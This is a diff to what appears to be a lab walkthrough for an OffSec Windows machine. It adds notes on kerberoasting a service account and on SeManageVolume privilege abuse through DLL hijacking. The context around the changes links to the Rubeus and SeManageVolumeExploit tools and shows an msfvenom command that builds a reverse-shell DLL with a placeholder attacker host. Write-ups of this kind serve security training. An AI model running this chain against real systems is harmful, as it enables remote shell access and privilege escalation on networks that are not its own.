@@ -94,6 +94,12 @@ The command completed successfully.
 
 ## Kerberos Abuse
 
+The user `svc_mssql` has Service Principal Name, hence kerberoasting takes place.
+
+```text
+serviceprincipalname          : MSSQLSvc/DC.access.offsec
+```
+
 [Rubeus.exe](https://github.com/r3motecontrol/Ghostpack-CompiledBinaries/blob/master/Rubeus.exe)
 
 Run as below to obtain NTLM Hash.
@@ -134,6 +140,8 @@ SeManageVolumePrivilege       Perform volume maintenance tasks Disabled
 SeIncreaseWorkingSetPrivilege Increase a process working set   Disabled
 ```
 
+Bypass traverse checking allows us to perform seManageVolumeAbuse by performing dll hijacking.
+
 [SeManageVolumeAbuse](https://github.com/CsEnox/SeManageVolumeExploit)
 
 Transfer the binary to the remote machine and run as `svc_mssql` user.
@@ -145,7 +153,7 @@ Entries changed: 916
 DONE 
 ```
 
-Create a dll file with windows reverse shell
+Create a dll file with windows reverse shell.
 
 ```sh
 msfvenom -f dll -a x64 -p windows/x64/shell_reverse_tcp LHOST=<IP> LPORT=9090 -o Printconfig.dll
